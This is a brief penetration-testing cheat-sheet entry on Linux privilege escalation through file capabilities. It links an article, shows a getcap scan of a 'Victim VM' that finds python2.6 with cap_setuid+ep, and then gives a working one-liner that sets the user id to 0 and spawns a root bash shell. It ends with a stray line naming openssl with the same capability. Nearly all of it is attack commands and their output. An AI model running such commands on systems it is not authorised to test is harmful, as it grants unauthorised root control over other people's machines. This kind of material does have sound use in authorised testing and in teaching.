[Linux Priv. Esc. Capabilities](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)** <- Check.**
### Victim VM
```bash
$ getcap -r / 2>/dev/null
	/usr/bin/python2.6 = cap_setuid+ep
```
### Exploitation
```bash
$ /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```


openssl = cap_setuid+ep